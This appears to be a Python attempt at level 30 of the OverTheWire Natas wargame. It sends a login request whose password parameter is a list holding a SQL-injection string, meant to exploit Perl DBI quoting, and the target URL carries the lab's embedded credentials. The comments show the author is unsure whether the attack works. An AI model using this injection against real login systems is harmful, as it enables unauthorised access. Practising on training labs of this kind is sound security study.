import requests
session = requests.Session()

def natas30(url):
    # I think it needs to be done like this,
    # see https://stackoverflow.com/questions/40273267/is-perl-function-dbh-quote-still-secure
    # This should work, but maybe the quoting is done a bit different?
    # 
    # I do check for the next user (which I know will exist)
    # And do a SQL injection to let any password work,
    # To test the theory that param as list is the problem
    #
    # Any tips?
    
    params={"username": "natas31", "password": ['lol"%20OR%20"1"="1', 10]}
    response = session.post(url, data=params)
    # print(response.text)
    # print(params)
    if 'fail' in response.text:
        print("FAILED")
    else:
        print("SUCCES")

if __name__ == '__main__':
    url = 'http://natas30:wie9iexae0Daihohv8vuu3cei9wahf0e@natas30.natas.labs.overthewire.org/'
    natas30(url)
